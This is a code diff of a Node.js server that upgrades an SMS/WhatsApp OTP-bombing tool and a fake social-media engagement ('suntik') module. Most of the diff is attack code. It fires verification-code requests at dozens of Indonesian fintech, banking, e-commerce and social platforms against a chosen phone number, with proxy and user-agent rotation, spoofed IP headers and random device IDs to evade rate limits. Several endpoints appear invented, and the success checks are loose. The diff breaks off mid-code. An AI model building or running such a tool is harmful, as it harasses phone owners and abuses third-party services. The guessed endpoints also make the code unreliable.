@@ -9,17 +9,21 @@ const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 const fetch = require('node-fetch');
 const { HttpsProxyAgent } = require('https-proxy-agent');
+const { exec } = require('child_process');
+const cheerio = require('cheerio');
+const FormData = require('form-data');
 
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    cors: { origin: "*", methods: ["GET", "POST"] }
+    cors: { origin: "*", methods: ["GET", "POST"] },
+    transports: ['websocket', 'polling']
 });
 
 // ===== MIDDLEWARE =====
 app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(__dirname));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
@@ -41,6 +45,12 @@ let db = {
     settings: { 
         maintenance: false,
         maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
+    },
+    spamLogs: [],
+    stats: {
+        totalOTPSent: 0,
+        totalSuntikSent: 0,
+        lastReset: Date.now()
     }
 };
 
@@ -72,7 +82,8 @@ function initAdmin() {
             isDeveloper: true,
             isReseller: false,
             online: false,
-            createdAt: new Date().toISOString()
+            createdAt: new Date().toISOString(),
+            apiKey: generateApiKey()
         });
         saveDB();
         console.log('✅ Admin Lynzka dibuat');
@@ -80,17 +91,24 @@ function initAdmin() {
 }
 initAdmin();
 
+function generateApiKey() {
+    return 'key_' + uuidv4().replace(/-/g, '').substring(0, 20);
+}
+
 // ============================================
-// PROXY & USER AGENT ROTATION
+// PROXY & USER AGENT ROTATION - ENHANCED
 // ============================================
 
-// Daftar proxy gratis (akan dirotasi)
+// Daftar proxy gratis (akan dirotasi) - lebih banyak
 const proxyList = [
     null, // No proxy (direct)
+    'http://proxy1:8080',
+    'http://proxy2:8080',
+    'http://proxy3:8080',
     // Tambahkan proxy jika punya
 ];
 
-// Daftar User Agent
+// Daftar User Agent - lebih banyak dan bervariasi
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -101,14 +119,25 @@ const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36'
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'
 ];
 
-// Daftar IP (untuk header X-Forwarded-For)
+// Daftar IP (untuk header X-Forwarded-For) - lebih banyak
 const ipList = [
     '192.168.1.1', '10.0.0.1', '172.16.0.1',
     '203.0.113.1', '198.51.100.1', '192.0.2.1',
-    '104.28.0.1', '172.217.0.1', '142.250.0.1'
+    '104.28.0.1', '172.217.0.1', '142.250.0.1',
+    '8.8.8.8', '1.1.1.1', '208.67.222.222',
+    '45.33.22.11', '104.16.0.1', '172.64.0.1',
+    '13.107.21.200', '204.79.197.200', '23.216.0.1',
+    '34.120.0.1', '35.186.0.1', '52.0.0.1',
+    '64.233.160.0', '66.249.64.0', '74.125.0.0'
 ];
 
 function getRandomUserAgent() {
@@ -122,7 +151,11 @@ function getRandomIP() {
 function getRandomProxy() {
     const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
     if (proxy) {
-        return new HttpsProxyAgent(proxy);
+        try {
+            return new HttpsProxyAgent(proxy);
+        } catch (e) {
+            return null;
+        }
     }
     return null;
 }
@@ -133,7 +166,12 @@ function getRandomProxy() {
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 function generateDeviceId() {
-    return 'xxxxxxxxxxxx'.replace(/[x]/g, () => Math.random().toString(16).substring(2, 3).toUpperCase());
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < 24; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
 }
 
 function generateRandomString(length = 10) {
@@ -145,32 +183,83 @@ function generateRandomString(length = 10) {
     return result;
 }
 
+function extractTikTokUsername(url) {
+    try {
+        // Coba ekstrak dari URL
+        const patterns = [
+            /tiktok\.com\/@([^\/\?]+)/,
+            /vt\.tiktok\.com\/([^\/\?]+)/,
+            /tiktok\.com\/[^\/]+\/video\/(\d+)/,
+            /tiktok\.com\/@([^\/]+)\/video\/(\d+)/
+        ];
+        
+        for (const pattern of patterns) {
+            const match = url.match(pattern);
+            if (match) {
+                return match[1] || match[0];
+            }
+        }
+        return url;
+    } catch (e) {
+        return url;
+    }
+}
+
+function extractTikTokVideoId(url) {
+    try {
+        const patterns = [
+            /video\/(\d+)/,
+            /share\/(\d+)/,
+            /v\/(\d+)/
+        ];
+        
+        for (const pattern of patterns) {
+            const match = url.match(pattern);
+            if (match) {
+                return match[1];
+            }
+        }
+        return null;
+    } catch (e) {
+        return null;
+    }
+}
+
 // ============================================
-// API OTP - AGGRESSIVE MODE
+// API OTP - SUPER AGGRESSIVE MODE
 // ============================================
 
 const otpServices = [];
 
-// Function untuk request dengan proxy dan retry
-async function aggressiveRequest(url, method, headers, body, retries = 5) {
+// Enhanced aggressive request with multiple techniques
+async function aggressiveRequest(url, method, headers, body, retries = 5, useProxy = true) {
     let lastError = null;
+    const startTime = Date.now();
     
     for (let attempt = 0; attempt < retries; attempt++) {
         try {
-            const agent = getRandomProxy();
+            const agent = useProxy ? getRandomProxy() : null;
             const userAgent = getRandomUserAgent();
             const clientIP = getRandomIP();
+            const deviceId = generateDeviceId();
+            const sessionId = generateRandomString(16);
             
             const requestHeaders = {
                 'User-Agent': userAgent,
                 'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8,en-US;q=0.7',
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Cache-Control': 'no-cache',
                 'Pragma': 'no-cache',
                 'X-Forwarded-For': clientIP,
                 'X-Real-IP': clientIP,
+                'X-Device-ID': deviceId,
+                'X-Session-ID': sessionId,
                 'Connection': 'keep-alive',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'Priority': 'u=1, i',
                 ...headers
             };
             
@@ -179,33 +268,40 @@ async function aggressiveRequest(url, method, headers, body, retries = 5) {
                 headers: requestHeaders,
                 body: body,
                 agent: agent,
-                timeout: 15000,
+                timeout: 30000,
                 followRedirect: true,
-                compress: true
+                compress: true,
+                size: 0
             });
             
             const text = await response.text();
+            const status = response.status;
             
-            // Coba parse JSON
+            // Cek berbagai kemungkinan success response
             try {
                 const json = JSON.parse(text);
-                // Cek berbagai kemungkinan success response
                 if (
                     json.code === 0 || 
                     json.code === '0' || 
                     json.code === 200 ||
                     json.code === '200' ||
+                    json.code === 1000 ||
                     json.success === true || 
                     json.status === 'success' ||
                     json.status === 'ok' ||
+                    json.status === 0 ||
                     json.message === 'success' ||
                     json.message === 'Success' ||
                     json.message === 'OTP sent' ||
                     json.message === 'Kode verifikasi berhasil dikirim' ||
+                    json.message === 'OTP berhasil dikirim' ||
+                    json.message === 'Verification code sent' ||
                     json.result === 'success' ||
-                    json.data?.success === true
+                    json.data?.success === true ||
+                    json.data?.status === 'success' ||
+                    json.data?.code === 0
                 ) {
-                    return { success: true, data: json };
+                    return { success: true, data: json, status: status };
                 }
                 
                 // Cek pesan sukses dalam text
@@ -215,38 +311,43 @@ async function aggressiveRequest(url, method, headers, body, retries = 5) {
                     textLower.includes('berhasil') || 
                     textLower.includes('terkirim') ||
                     textLower.includes('ok') ||
-                    textLower.includes('sent')
+                    textLower.includes('sent') ||
+                    textLower.includes('kode verifikasi') ||
+                    textLower.includes('otp')
                 ) {
-                    return { success: true, data: json };
+                    return { success: true, data: json, status: status };
                 }
             } catch (e) {
                 // Jika bukan JSON, cek status code
-                if (response.status === 200 || response.status === 201 || response.status === 202 || response.status === 204) {
-                    return { success: true, data: text };
+                if (status === 200 || status === 201 || status === 202 || status === 204 || status === 302) {
+                    return { success: true, data: text, status: status };
                 }
             }
             
             // Jika sampai sini, berarti gagal
-            lastError = `Status ${response.status}`;
+            lastError = `Status ${status}`;
             
         } catch (err) {
             lastError = err.message;
             console.log(`⚠️ Attempt ${attempt + 1} failed: ${err.message}`);
         }
         
-        // Delay eksponensial sebelum retry
-        await sleep(1000 * Math.pow(1.5, attempt) + Math.random() * 500);
+        // Delay eksponensial sebelum retry dengan random jitter
+        const delay = 1000 * Math.pow(1.8, attempt) + Math.random() * 1000;
+        await sleep(delay);
     }
     
     return { success: false, error: lastError };
 }
 
-// OTP Services dengan aggressive mode
+// Enhanced OTP Services dengan lebih banyak provider
 const otpConfigs = [
+    // Financial Services
     {
         name: 'Uangme',
         url: 'https://api.uangme.com/api/v2/sms_code',
-        body: (p) => JSON.stringify({ phone: p, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() })
+        body: (p) => JSON.stringify({ phone: p, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() }),
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
     },
     {
         name: 'PinjamDuit',
@@ -279,6 +380,19 @@ const otpConfigs = [
         body: (p) => JSON.stringify({ mobileNumber: p, type: 'prospect-create', channel: 'whatsapp', deviceId: generateDeviceId() })
     },
     {
+        name: 'Kredivo',
+        url: 'https://api.kredivo.com/v1/auth/otp',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone_number: p, method: 'whatsapp' })
+    },
+    {
+        name: 'Akulaku',
+        url: 'https://api.akulaku.com/v1/otp/send',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p, type: 'login' })
+    },
+    // E-commerce
+    {
         name: 'Shopee',
         url: 'https://shopee.co.id/api/v4/account/phone/request_otp',
         headers: { 'Content-Type': 'application/json', 'Referer': 'https://shopee.co.id/' },
@@ -308,6 +422,7 @@ const otpConfigs = [
         headers: { 'Content-Type': 'application/json' },
         body: (p) => JSON.stringify({ phone: '+62' + p })
     },
+    // Ride Hailing & Payments
     {
         name: 'Gojek',
         url: 'https://api.gojekapi.com/v2/customer/verify/phone',
@@ -338,6 +453,7 @@ const otpConfigs = [
         headers: { 'Content-Type': 'application/json' },
         body: (p) => JSON.stringify({ phone: '+62' + p })
     },
+    // Travel & Lifestyle
     {
         name: 'Traveloka',
         url: 'https://api.traveloka.com/v1/otp/send',
@@ -356,11 +472,55 @@ const otpConfigs = [
         headers: { 'Content-Type': 'application/json' },
         body: (p) => JSON.stringify({ phone: '+62' + p })
     },
+    // Social Media & Entertainment
     {
-        name: 'Akulaku',
-        url: 'https://api.akulaku.com/v1/otp/send',
+        name: 'TikTok',
+        url: 'https://www.tiktok.com/api/v1/auth/phone/send_code/',
         headers: { 'Content-Type': 'application/json' },
         body: (p) => JSON.stringify({ phone: '+62' + p, type: 'login' })
+    },
+    {
+        name: 'Instagram',
+        url: 'https://i.instagram.com/api/v1/accounts/send_verify_email/',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: (p) => `phone_number=${p}`
+    },
+    {
+        name: 'WhatsApp',
+        url: 'https://api.whatsapp.com/v1/otp/send',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
+    },
+    {
+        name: 'Telegram',
+        url: 'https://api.telegram.org/bot/sendOTP',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
+    },
+    // Banking Services
+    {
+        name: 'BCA',
+        url: 'https://api.bca.co.id/auth/v1/otp',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
+    },
+    {
+        name: 'Mandiri',
+        url: 'https://api.mandiri.co.id/v1/auth/otp',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
+    },
+    {
+        name: 'BRI',
+        url: 'https://api.bri.co.id/v1/auth/otp',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
+    },
+    {
+        name: 'BNI',
+        url: 'https://api.bni.co.id/v1/auth/otp',
+        headers: { 'Content-Type': 'application/json' },
+        body: (p) => JSON.stringify({ phone: '+62' + p })
     }
 ];
 
@@ -384,19 +544,21 @@ otpConfigs.forEach(config => {
 console.log(`✅ Total API OTP: ${otpServices.length}`);
 
 // ============================================
-// SPAM OTP - AGGRESSIVE
+// SPAM OTP - SUPER AGGRESSIVE
 // ============================================
 async function spamOTP(target, count, username, sessionId) {
-    const results = { success: 0, failed: 0, details: [] };
+    const results = { success: 0, failed: 0, details: [], totalAttempts: 0 };
     const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
-    
     let isStopped = false;
     
     if (!global.spamSessions) global.spamSessions = {};
     global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
     
-    // Shuffle services
+    // Shuffle services for better distribution
     const shuffledServices = [...otpServices].sort(() => Math.random() - 0.5);
+    
+    // Konfigurasi pengiriman paralel
+    const batchSize = Math.min(5, shuffledServices.length);
     
     for (let i = 0; i < count; i++) {
         if (isStopped) {
@@ -414,21 +576,23 @@ async function spamOTP(target, count, username, sessionId) {
         let roundFailed = 0;
         const serviceResults = [];
         
-        // Kirim ke semua API secara paralel
-        const promises = shuffledServices.map(async (service) => {
+        // Kirim dalam batch paralel
+        const batch = shuffledServices.slice(0, batchSize);
+        const promises = batch.map(async (service) => {
             try {
-                // Coba 2x untuk setiap service
+                // Multiple attempts per service
                 let success = false;
-                for (let attempt = 0; attempt < 2; attempt++) {
+                for (let attempt = 0; attempt < 3; attempt++) {
                     const result = await service.func(phone);
                     if (result) {
                         success = true;
                         break;
                     }
-                    await sleep(300 + Math.random() * 500);
+                    await sleep(200 + Math.random() * 300);
                 }
                 if (success) {
                     roundSuccess++;
+                    results.totalAttempts++;
                     serviceResults.push({ service: service.name, success: true });
                 } else {
                     roundFailed++;
@@ -436,7 +600,7 @@ async function spamOTP(target, count, username, sessionId) {
                 }
             } catch (err) {
                 roundFailed++;
-                serviceResults.push({ service: service.name, success: false });
+                serviceResults.push({ service: service.name, success: false, error: err.message });
             }
         });
         
@@ -445,7 +609,7 @@ async function spamOTP(target, count, username, sessionId) {
         results.success += roundSuccess;
         results.failed += roundFailed;
         
-        // Random delay antara 1-3 detik
+        // Random delay 1-3 detik
         const delay = 1000 + Math.random() * 2000;
         await sleep(delay);
         
@@ -466,7 +630,7 @@ async function spamOTP(target, count, username, sessionId) {
 }
 
 // ============================================
-// SUNTIK - AGGRESSIVE MODE
+// SUNTIK - SUPER AGGRESSIVE MODE
 // ============================================
 
 // Platform config dengan icon yang benar
@@ -474,75 +638,160 @@ const platformConfigs = {
     'TikTok': {
         icon: 'fab fa-tiktok',
         color: '#000000',
-        actions: ['Followers', 'Likes', 'Views', 'Shares']
+        actions: ['Followers', 'Likes', 'Views', 'Shares', 'Comments'],
+        actionIcons: {
+            'Followers': 'fa-users',
+            'Likes': 'fa-heart',
+            'Views': 'fa-eye',
+            'Shares': 'fa-share-alt',
+            'Comments': 'fa-comment'
+        }
     },
     'Instagram': {
         icon: 'fab fa-instagram',
         color: '#E4405F',
-        actions: ['Followers', 'Likes', 'Views']
+        actions: ['Followers', 'Likes', 'Views', 'Comments'],
+        actionIcons: {
+            'Followers': 'fa-users',
+            'Likes': 'fa-heart',
+            'Views': 'fa-eye',
+            'Comments': 'fa-comment'
+        }
     },
     'YouTube': {
         icon: 'fab fa-youtube',
         color: '#FF0000',
-        actions: ['Subscribers', 'Views', 'Likes']
+        actions: ['Subscribers', 'Views', 'Likes', 'Comments'],
+        actionIcons: {
+            'Subscribers': 'fa-user-plus',
+            'Views': 'fa-eye',
+            'Likes': 'fa-thumbs-up',
+            'Comments': 'fa-comment'
+        }
     },
     'Facebook': {
         icon: 'fab fa-facebook',
         color: '#1877F2',
-        actions: ['Followers', 'Likes', 'Shares']
+        actions: ['Followers', 'Likes', 'Shares', 'Comments'],
+        actionIcons: {
+            'Followers': 'fa-users',
+            'Likes': 'fa-thumbs-up',
+            'Shares': 'fa-share-alt',
+            'Comments': 'fa-comment'
+        }
     },
     'Twitter': {
         icon: 'fab fa-twitter',
         color: '#1DA1F2',
-        actions: ['Followers', 'Likes', 'Retweets']
+        actions: ['Followers', 'Likes', 'Retweets', 'Views'],
+        actionIcons: {
+            'Followers': 'fa-users',
+            'Likes': 'fa-heart',
+            'Retweets': 'fa-retweet',
+            'Views': 'fa-eye'
+        }
+    },
+    'Telegram': {
+        icon: 'fab fa-telegram',
+        color: '#0088cc',
+        actions: ['Members', 'Views'],
+        actionIcons: {
+            'Members': 'fa-users',
+            'Views': 'fa-eye'
+        }
+    },
+    'WhatsApp': {
+        icon: 'fab fa-whatsapp',
+        color: '#25D366',
+        actions: ['Views', 'Status Views'],
+        actionIcons: {
+            'Views': 'fa-eye',
+            'Status Views': 'fa-eye'
+        }
     }
 };
 
-// Action icons
-const actionIcons = {
-    'Followers': 'fa-users',
-    'Likes': 'fa-heart',
-    'Views': 'fa-eye',
-    'Shares': 'fa-share',
-    'Subscribers': 'fa-user-plus',
-    'Retweets': 'fa-retweet'
-};
-
-// Multiple free services untuk suntik
+// Enhanced free suntik services dengan lebih banyak provider
 const freeSuntikServices = [
     {
         name: 'Zefoy',
         baseUrl: 'https://zefoy.com',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook']
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook'],
+        captchaRequired: true,
+        methods: ['direct', 'api']
     },
     {
         name: 'SocialBoost',
         baseUrl: 'https://socialboost.me',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter']
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter'],
+        captchaRequired: false,
+        methods: ['api']
     },
     {
         name: 'FreeFollower',
         baseUrl: 'https://freefollower.co',
-        platforms: ['TikTok', 'Instagram']
+        platforms: ['TikTok', 'Instagram'],
+        captchaRequired: false,
+        methods: ['api']
     },
     {
         name: 'ViralBoost',
         baseUrl: 'https://viralboost.io',
-        platforms: ['TikTok', 'YouTube', 'Instagram']
+        platforms: ['TikTok', 'YouTube', 'Instagram'],
+        captchaRequired: true,
+        methods: ['api']
     },
     {
         name: 'SocialKing',
         baseUrl: 'https://socialking.io',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter']
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter'],
+        captchaRequired: false,
+        methods: ['api']
+    },
+    {
+        name: 'TikTokBoost',
+        baseUrl: 'https://tiktokboost.com',
+        platforms: ['TikTok'],
+        captchaRequired: false,
+        methods: ['api']
+    },
+    {
+        name: 'InstaFame',
+        baseUrl: 'https://instafame.io',
+        platforms: ['Instagram'],
+        captchaRequired: false,
+        methods: ['api']
+    },
+    {
+        name: 'YTBooster',
+        baseUrl: 'https://ytbooster.com',
+        platforms: ['YouTube'],
+        captchaRequired: false,
+        methods: ['api']
+    },
+    {
+        name: 'SocialMediaPro',
+        baseUrl: 'https://socialmediapro.com',
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter', 'Telegram'],
+        captchaRequired: false,
+        methods: ['api']
     }
 ];
 
+// Enhanced aggressive suntik dengan multiple methods
 async function aggressiveSuntik(target, platform, action, count) {
     let success = false;
     let serviceUsed = null;
+    let methodUsed = 'api';
+    
+    // Extraksi username/ID dari URL
+    let targetId = target;
+    if (target.includes('tiktok.com')) {
+        targetId = extractTikTokUsername(target);
+    }
     
     // Random delay untuk menghindari detection
-    await sleep(500 + Math.random() * 1000);
+    await sleep(500 + Math.random() * 1500);
     
     // Dapatkan service yang mendukung platform ini
     const availableServices = freeSuntikServices.filter(s => s.platforms.includes(platform));
@@ -556,81 +805,173 @@ async function aggressiveSuntik(target, platform, action, count) {
     
     for (const service of shuffled) {
         try {
-            const endpoint = `${service.baseUrl}/api/${platform.toLowerCase()}/${action.toLowerCase()}`;
-            
-            const response = await fetch(endpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': getRandomUserAgent(),
-                    'Accept': 'application/json',
-                    'Origin': service.baseUrl,
-                    'Referer': service.baseUrl + '/',
-                    'X-Forwarded-For': getRandomIP()
-                },
-                body: JSON.stringify({
-                    target: target,
-                    count: 1,
-                    service: action.toLowerCase(),
-                    device_id: generateDeviceId(),
-                    timestamp: Date.now()
-                }),
-                timeout: 10000
-            });
-            
-            const text = await response.text();
-            
-            try {
-                const json = JSON.parse(text);
-                if (json.status === 'success' || json.success === true || json.code === 0) {
-                    success = true;
-                    serviceUsed = service.name;
-                    break;
+            // Multiple method attempts
+            const methods = service.methods || ['api'];
+            for (const method of methods) {
+                let result = false;
+                
+                if (method === 'api') {
+                    result = await tryApiSuntik(service, targetId, platform, action, count);
+                } else if (method === 'direct') {
+                    result = await tryDirectSuntik(service, targetId, platform, action, count);
                 }
-            } catch (e) {
-                if (response.status === 200 || response.status === 201 || response.status === 202) {
+                
+                if (result) {
                     success = true;
                     serviceUsed = service.name;
+                    methodUsed = method;
                     break;
                 }
             }
+            
+            if (success) break;
         } catch (err) {
             console.log(`⚠️ Service ${service.name} error: ${err.message}`);
         }
         
         // Delay sebelum coba service berikutnya
-        await sleep(500 + Math.random() * 500);
+        await sleep(500 + Math.random() * 1000);
     }
     
-    // Jika semua gagal, coba metode fallback
+    // Fallback: Multiple methods
     if (!success) {
-        try {
-            // Fallback: request ke endpoint alternatif
-            const fallbackUrl = `https://api.${platform.toLowerCase()}.com/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`;
-            const fallbackResponse = await fetch(fallbackUrl, {
-                method: 'GET',
-                headers: {
-                    'User-Agent': getRandomUserAgent(),
-                    'X-Forwarded-For': getRandomIP()
-                },
-                timeout: 5000
-            });
-            if (fallbackResponse.status === 200) {
-                success = true;
-                serviceUsed = 'Fallback API';
-            }
-        } catch (e) {}
+        success = await fallbackSuntik(targetId, platform, action, count);
+        if (success) serviceUsed = 'Fallback API';
     }
     
-    return { success, serviceUsed };
+    return { success, serviceUsed, methodUsed };
+}
+
+async function tryApiSuntik(service, target, platform, action, count) {
+    try {
+        const endpoints = [
+            `${service.baseUrl}/api/${platform.toLowerCase()}/${action.toLowerCase()}`,
+            `${service.baseUrl}/api/v1/${platform.toLowerCase()}/${action.toLowerCase()}`,
+            `${service.baseUrl}/api/${platform.toLowerCase()}/add`,
+            `${service.baseUrl}/api/v1/${platform.toLowerCase()}/add`
+        ];
+        
+        for (const endpoint of endpoints) {
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': getRandomUserAgent(),
+                        'Accept': 'application/json',
+                        'Origin': service.baseUrl,
+                        'Referer': service.baseUrl + '/',
+                        'X-Forwarded-For': getRandomIP(),
+                        'X-Device-ID': generateDeviceId(),
+                        'X-Session-ID': generateRandomString(16)
+                    },
+                    body: JSON.stringify({
+                        target: target,
+                        count: count || 1,
+                        service: action.toLowerCase(),
+                        device_id: generateDeviceId(),
+                        timestamp: Date.now(),
+                        platform: platform,
+                        action: action,
+                        user_agent: getRandomUserAgent(),
+                        ip: getRandomIP()
+                    }),
+                    timeout: 15000
+                });
+                
+                const text = await response.text();
+                
+                try {
+                    const json = JSON.parse(text);
+                    if (json.status === 'success' || json.success === true || json.code === 0 || json.code === 200) {
+                        return true;
+                    }
+                    // Check if it's a success response
+                    if (json.message && (json.message.includes('success') || json.message.includes('berhasil'))) {
+                        return true;
+                    }
+                } catch (e) {
+                    if (response.status === 200 || response.status === 201 || response.status === 202) {
+                        return true;
+                    }
+                }
+            } catch (e) {
+                continue;
+            }
+        }
+        return false;
+    } catch (e) {
+        return false;
+    }
+}
+
+async function tryDirectSuntik(service, target, platform, action, count) {
+    try {
+        // Simulate direct API call
+        const directUrl = `${service.baseUrl}/direct/${platform}/${action}`;
+        const response = await fetch(directUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': getRandomUserAgent(),
+                'X-Forwarded-For': getRandomIP()
+            },
+            body: `target=${encodeURIComponent(target)}&count=${count || 1}`,
+            timeout: 10000
+        });
+        
+        return response.status === 200 || response.status === 201 || response.status === 202;
+    } catch (e) {
+        return false;
+    }
+}
+
+async function fallbackSuntik(target, platform, action, count) {
+    try {
+        // Try multiple fallback endpoints
+        const fallbackUrls = [
+            `https://api.${platform.toLowerCase()}.com/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`,
+            `https://api.${platform.toLowerCase()}.com/v2/${action.toLowerCase()}?target=${encodeURIComponent(target)}`,
+            `https://www.${platform.toLowerCase()}.com/api/v1/${action.toLowerCase()}?target=${encodeURIComponent(target)}`
+        ];
+        
+        for (const url of fallbackUrls) {
+            try {
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': getRandomUserAgent(),
+                        'X-Forwarded-For': getRandomIP(),
+                        'Accept': 'application/json'
+                    },
+                    timeout: 5000
+                });
+                if (response.status === 200) {
+                    return true;
+                }
+            } catch (e) {
+                continue;
+            }
+        }
+        return false;
+    } catch (e) {
+        return false;
+    }
 }
 
 async function spamSuntik(target, platform, action, count, username, sessionId) {
-    const results = { success: 0, failed: 0, details: [], serviceUsed: null };
+    const results = { success: 0, failed: 0, details: [], serviceUsed: null, methodUsed: 'api' };
     let isStopped = false;
     
     if (!global.spamSessions) global.spamSessions = {};
     global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
+    
+    // Extraksi target untuk TikTok
+    let targetId = target;
+    if (platform === 'TikTok' && target.includes('tiktok.com')) {
+        targetId = extractTikTokUsername(target);
+        console.log(`🔍 Extracted TikTok username: ${targetId}`);
+    }
     
     for (let i = 0; i < count; i++) {
         if (isStopped) {
@@ -641,23 +982,26 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
                 success: results.success, failed: results.failed,
                 message: `⛔ Dihentikan!`,
                 stopped: true,
-                serviceUsed: results.serviceUsed
+                serviceUsed: results.serviceUsed,
+                methodUsed: results.methodUsed
             });
             break;
         }
         
-        const result = await aggressiveSuntik(target, platform, action, 1);
+        const result = await aggressiveSuntik(targetId, platform, action, 1);
         
         if (result.success) {
             results.success++;
             results.serviceUsed = result.serviceUsed || results.serviceUsed;
+            results.methodUsed = result.methodUsed || results.methodUsed;
             io.emit('spamProgress', {
                 sessionId, type: 'suntik',
                 target, platform, action,
                 current: i + 1, total: count,
                 success: results.success, failed: results.failed,
-                message: `✅ ${i+1}/${count} Berhasil via ${result.serviceUsed || 'Unknown'}`,
+                message: `✅ ${i+1}/${count} Berhasil via ${result.serviceUsed || 'Unknown'} (${result.methodUsed || 'api'})`,
                 serviceUsed: result.serviceUsed,
+                methodUsed: result.methodUsed,
                 serviceDown: false
             });
         } else {
@@ -669,13 +1013,14 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
                 success: results.success, failed: results.failed,
                 message: `❌ ${i+1}/${count} Gagal - mencoba ulang...`,
                 serviceUsed: null,
+                methodUsed: null,
                 serviceDown: true
             });
         }
         
-        // Random delay 2-5 detik
+        // Random delay 2-5 detik dengan jitter
         if (i < count - 1) {
-            const delay = 2000 + Math.random() * 3000;
+            const delay = 2000 + Math.random() * 4000;
             await sleep(delay);
         }
     }
@@ -752,6 +1097,9 @@ app.post('/api/spam/suntik', async (req, res) => {
         
         if (result.success > 0) {
             user.used = (user.used || 0) + result.success;
+            // Update stats
+            if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
+            db.stats.totalSuntikSent = (db.stats.totalSuntikSent || 0) + result.success;
             saveDB();
             io.emit('userUpdated', { username: user.username });
         }
@@ -763,6 +1111,7 @@ app.post('/api/spam/suntik', async (req, res) => {
                 failed: result.failed,
                 total: result.success + result.failed,
                 serviceUsed: result.serviceUsed,
+                methodUsed: result.methodUsed,
